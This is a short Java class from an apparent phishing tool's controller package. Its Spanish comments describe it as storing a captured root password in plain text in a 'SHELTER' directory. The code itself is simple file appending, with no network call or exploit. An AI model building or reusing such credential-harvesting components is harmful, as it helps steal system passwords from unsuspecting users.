package org.policykit.phishing.controller;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class RootOfTheProcess {
	
	private String passwrd = null;

	public RootOfTheProcess() {
		// TODO Auto-generated constructor stub
	}

	public RootOfTheProcess(String Passwrd) {

		this.passwrd = Passwrd;
	}

	public String getPasswrd() {
		return passwrd;
	}

	public void setPasswrd(String passwrd) {
		this.passwrd = passwrd;
	}

	/**
	 * Almacena el password root en el directorio SHELTER en
	 * texto plano
	 * @param Passwrd Contrasena root capturada
	 * @param Dir Almacenamiento
	 */
	public void savePassword(String Passwrd, String Dir) {

        File archivo = new File(Dir);
        BufferedWriter bw;

        try {

            if(archivo.exists()) {
                bw = new BufferedWriter(new FileWriter(archivo, true));
                bw.append(Passwrd+"\n");

            } else {
                bw = new BufferedWriter(new FileWriter(archivo, true));
                bw.append(Passwrd+"\n");
            }
            bw.close();

        } catch (IOException e) {
			e.printStackTrace();
		}


	}

}
